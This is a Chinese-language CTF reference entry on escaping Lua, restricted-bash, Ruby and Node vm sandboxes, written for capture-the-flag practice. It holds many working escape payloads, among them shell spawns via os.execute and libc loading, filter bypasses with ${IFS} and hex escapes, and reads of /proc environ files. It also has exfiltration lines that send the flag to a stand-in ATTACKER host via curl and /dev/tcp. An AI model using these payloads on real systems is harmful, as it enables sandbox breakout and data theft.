---
title: 语言级沙箱逃逸（Lua / bashjail / Ruby / JS 沙箱）
category: misc
tags: [lua沙箱, bashjail, 逃逸, rb-jail, node-sandbox, 命令拼接]
signals: [题目是 lua 交互环境, 给了个功能受限的 shell, 允许输入但禁止 cat, 只能用一部分命令, 题面给了正则过滤, 需要读文件却无回显]
difficulty: medium
source: "CTF-Wiki Shell 沙盒章节 / Lua 5.4 参考手册 / GNU Bash 手册 / Node vm 文档"
tools: [lua5.4, bash, ruby, node, nc, pwntools, dash]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 交互界面是 `lua> ` 或直接给一段 `load()` 包装过的 Lua 代码。
- 题目给了个 `bashjail`：能用 `ls`、`echo`，但 `cat`、`sh`、`/` 被过滤。
- stdin 被正则限制，例如 `re.match(r'^[a-z]+$', input())`。
- 提示"flag 在环境变量里"或"flag 是文件名"。
- 只允许带参数执行某个二进制（如 `gcc`、`tar`、`git`），需要用它的功能读文件。

## 二、原理

语言沙箱的共同漏洞是：**宿主语言能调用系统能力**，只要找到一条没被过滤的路径即可。

- **Lua**：默认 `load/os/io/package/debug` 常被删。`string.dump`、`debug.getinfo`、`require`、`package.loadlib`（加载 .so）、`os.execute` 都是常见逃逸点；`#` 与 `...` 在 C 边界也能被滥用。
- **bashjail**：常见过滤法有白名单命令、禁 `/`、禁 `*`、`PATH` 限制。绕过思路是**用别的命令读文件**（`less`、`more`、`vim`、`awk`、`paste`、`tar`、`diff`）、**用变量拼接**（`a=/;b=flag;cat ${a}${b}`）、**用通配符**（`cat /f*`）、**用重定向失败报错**泄漏内容。
- **Ruby**：`ObjectSpace`、`eval`、`open(\`cmd\`)`（反引号形式）、`Kernel#system`。
- **Node**：`vm.runInNewContext` 并不隔离，`this.constructor.constructor('return process')()` 是经典逃逸。

## 三、操作步骤

1. **摸清可用能力**：列出可用的函数/命令，先用 `ls`/`echo`/`print` 探边界。
2. **确定目标**：读 `/flag`？读环境变量？执行 shell？
3. **找未过滤路径**：优先找"能执行命令/读文件"的原生接口（Lua 的 `os.execute`、bash 的 `$(...)`、Node 的 `process`）。
4. **拼接绕过**：把被禁字符拆成多段（变量、`chr`、`$'\x2f'`）。
5. **无回显时用外带**：`curl http://ATTACKER/?d=$(cat /flag)`、DNS 外带、或写文件后再读。

## 四、命令/脚本

### Lua 沙箱逃逸

```lua
-- 0. 先看环境
print(_VERSION)
for k, v in pairs(_G) do print(k) end

-- 1. os / io 还在时
os.execute('/bin/sh')
print(io.open('/flag'):read('*a'))

-- 2. 被删了 os/io，试 debug 库
debug.getinfo(1, 'f').func            -- 拿当前函数
debug.getupvalue(print, 1)            -- 挖出 upvalue 里藏的 env
-- 用 debug 拿 C 函数并调用
local f = debug.getinfo(1,'f').func
-- 遍历 registry 找一个能执行的：debug.getregistry()

-- 3. loadlib 加载 .so（如果能写文件）
package.loadlib('/lib/x86_64-linux-gnu/libc.so.6', 'system')('sh')
-- 或先 dump 一个 so 到 /tmp，再 loadlib

-- 4. string.dump + load 执行任意字节码（有些题只删了 loadstring）
load(string.dump(function() os.execute('sh') end))()

-- 5. 从 io 对象里找回
-- 若 io.write 还在，io.write 的内部可经 debug.getupvalue 拿到 io 表
```

```bash
# 本地测试
lua5.4 -e 'print(io.open("/etc/hostname"):read("*a"))'
```

### bashjail 逃逸

```bash
# 1. 探边界
echo $PATH; ls /; id; echo $0
compgen -c | sort -u | head        # 列出所有可用命令

# 2. 禁 cat —— 换工具读文件
less /flag; more /flag; head -c 200 /flag; tail -n +1 /flag
awk '{print}' /flag; sed '' /flag; paste /flag; cut -c1-200 /flag
tac /flag; nl /flag; grep '' /flag; od -c /flag; xxd /flag
vi /flag; vim /flag; emacs /flag; ed /flag; nano /flag
sort /flag; uniq /flag; rev /flag; expand /flag; fmt /flag
tar -cf - /flag | tar -xOf -        # tar 把文件直接输出到 stdout
gzip -c /flag >/dev/null 2>&1; base64 /flag

# 3. 禁 / 和 flag 关键字 —— 变量/通配/编码拼接
a=/; b=flag; cat $a$b
cat /????
cat /f*
cat $(echo L2ZsYWc= | base64 -d)         # 若 base64 可用
cat $'\x2fflag'
cat ${PWD%/*}/flag                       # 从 PWD 拼出根目录

# 4. 命令替换/子 shell 被禁时 —— 换重定向
cat </flag                                # 只禁了参数解析
read x </flag; echo $x
while read l; do echo $l; done </flag

# 5. 环境变量
env; printenv; echo $FLAG; cat /proc/self/environ | tr '\0' '\n'
cat /proc/1/environ | tr '\0' '\n'       # 父进程环境（常含 FLAG）

# 6. PATH 被限 —— 绝对路径 + 已知二进制的隐藏能力
/bin/cat /flag
/usr/bin/awk 'BEGIN{while((getline l < "/flag")>0)print l}'
python3 -c "print(open('/flag').read())"
php -r 'echo file_get_contents("/flag");'
perl -pe '' /flag
ruby -e 'puts File.read("/flag")'
node -e 'console.log(require("fs").readFileSync("/flag","utf8"))'
git -c core.pager="cat /flag" log --oneline    # pager 逃逸

# 7. 正则白名单（只允许 [a-z]+）—— 利用 shell 关键字拼接
l\s /; c\at /flag        # 反斜杠转义绕过正则匹配
${IFS}                   # 用 ${IFS} 代替空格
cat$IFS/flag
```

```bash
# 8. 无回显时外带
cat /flag | curl -s -X POST -d @- http://ATTACKER:8080/
cat /flag > /dev/tcp/ATTACKER/8080        # bash 内置 TCP
```

### Ruby 沙箱

```ruby
`cat /flag`
system('sh')
File.read('/flag')
IO.popen('cat /flag'){|io| puts io.read}
eval("`cat /flag`")
# 若禁用反引号/system，用 Kernel 的底层
Object.new.send(:`, 'cat /flag')       # 有些版本可行
```

### Node vm 沙箱

```javascript
this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/flag','utf8')
const p = this.constructor.constructor('return this')();
p.process.binding('spawn_sync')
// 或者
require('child_process').execSync('cat /flag').toString()
```

## 五、常见坑 / 变体

- **bashjail 的"能证明但拿不到"**：常用 `diff /flag /dev/null` 返回码差异做侧信道，一点点猜字符。
- **白名单命令**：`tar`、`rsync`、`zip`、`git`、`find -exec`、`xargs`、`env`、`awk`、`vim` 几乎都能任意读文件/执行命令。
- **禁空格**：`${IFS}`、`$IFS$9`、`<`、制表符 `\t`。
- **禁字母**：用 `$'\x63\x61\x74'` 或已有变量拼接。
- **Lua 的 `os` 被设成 nil 而非删除**：`debug.getregistry()` 里仍有 `_LOADED` 表可还原。
- **远端限制长度**：分批写入临时文件再执行。
- **沙盒日志**：有些题会把你输入的所有命令原样回显，此时用 `$( )` 嵌套构造。

## 六、参考来源

- [CTF Wiki - Shell 沙盒](https://ctf-wiki.org/pwn/sandbox/shell/readme/)
- [Lua 5.4 参考手册（load/loadlib/debug）](https://www.lua.org/manual/5.4/)
- [GNU Bash 参考手册（重定向与扩展）](https://www.gnu.org/software/bash/manual/bash.html)
- [Node.js vm 模块文档（非安全边界说明）](https://nodejs.org/api/vm.html)
- [GTFOBins - 可用于逃逸的合法二进制](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings)
